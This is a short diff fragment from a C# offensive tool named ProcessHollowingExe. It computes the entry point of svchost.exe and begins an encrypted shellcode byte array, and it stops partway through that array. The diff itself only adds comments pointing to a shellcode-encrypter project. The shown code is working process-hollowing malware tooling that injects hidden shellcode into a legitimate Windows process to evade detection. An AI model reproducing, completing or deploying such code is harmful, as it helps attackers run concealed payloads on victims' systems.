@@ -143,7 +143,8 @@ namespace ProcessHollowingExe
             //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual
             //address(RVA).We must add it to the image base to obtain the full memory address of the EntryPoint.
             IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
-
+            //This is encryped/shifted using the project
+            //https://github.com/sbridgens/ProcessHollowing/tree/main/ShellCodeEncrypter
             byte[] buf = new byte[] {
                 0xb3,0x77,0xe4,0xa4,0xba,0xe3,0x83,0x4d,0x39,0x9a,0x50,0x5c,0xc6,0xfc,0x28,0x55,0x15,
                 0xe2,0xe8,0x55,0xf2,0xba,0xa7,0x35,0xc8,0x9e,0xe0,0x62,0xf8,0x96,0x73,0x70,0x70,0x21,
